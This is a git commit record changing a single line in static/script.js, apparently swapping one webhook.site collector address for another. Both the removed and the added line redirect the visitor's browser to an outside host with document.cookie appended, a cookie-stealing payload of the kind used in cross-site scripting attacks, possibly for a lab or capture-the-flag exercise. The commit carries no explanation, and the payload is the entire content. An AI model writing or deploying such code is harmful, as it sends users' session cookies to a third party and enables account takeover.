a66cf6f09ac9cfa43c424266ff4e362e556c3ba6
ssongK <73736882+ssongK@users.noreply.github.com>
2022-11-16 23:55:30 +0900

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,1 @@
-location.href="https://webhook.site/88e71506-a931-426e-9d5b-2449b0a83ec5?"+document.cookie;
+location.href="https://webhook.site/95b45758-1485-4f9f-a44c-477ffc3c0ca4?"+document.cookie;
